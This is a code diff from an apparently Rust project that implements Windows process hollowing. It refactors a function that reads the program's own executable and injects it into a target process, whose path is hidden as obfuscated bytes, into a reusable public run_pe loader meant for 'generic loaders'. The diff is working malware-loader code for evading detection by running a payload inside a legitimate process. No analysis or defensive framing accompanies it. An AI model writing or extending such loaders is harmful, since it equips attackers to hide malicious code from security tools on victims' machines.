@@ -63,8 +63,15 @@ pub async fn perform_hollowing() -> bool {
         0xD6, 0xD8, 0xCF, 0x93, 0xD8, 0xC5, 0xD8,
     ]);
     let target = &target_str;
+    
+    let Ok(current_exe_path) = env::current_exe() else {
+        return false;
+    };
+    let Ok(payload_bytes) = std::fs::read(current_exe_path) else {
+        return false;
+    };
 
-    match hollow_and_run(target) {
+    match run_pe(&payload_bytes, target) {
         Ok(_) => {
             info!(
                 "successfully hollowed into {}, signaling for exit",
@@ -79,11 +86,9 @@ pub async fn perform_hollowing() -> bool {
     }
 }
 
-fn hollow_and_run(target_path: &str) -> Result<(), Box<dyn std::error::Error>> {
+pub fn run_pe(payload_bytes: &[u8], target_path: &str) -> Result<(), Box<dyn std::error::Error>> {
+    let mut payload_bytes = payload_bytes.to_vec();
     unsafe {
-        let current_exe_path = env::current_exe()?;
-        let mut payload_bytes = std::fs::read(current_exe_path)?;
-
         let mut si: STARTUPINFOW = std::mem::zeroed();
         si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;
         let mut pi: PROCESS_INFORMATION = std::mem::zeroed();
@@ -92,7 +97,10 @@ fn hollow_and_run(target_path: &str) -> Result<(), Box<dyn std::error::Error>> {
             .encode_wide()
             .chain(Some(0))
             .collect();
-        let mut command_line: Vec<u16> = OsStr::new(&format!("\"{}\" --hollowed", target_path))
+            
+        // For general usage, we don't necessarily pass arguments. 
+        // If we want to mimic the target's CLI, we could, but passing just the path is safer/simpler for generic loaders.
+        let mut command_line: Vec<u16> = OsStr::new(&format!("\"{}\"", target_path))
             .encode_wide()
             .chain(Some(0))
             .collect();
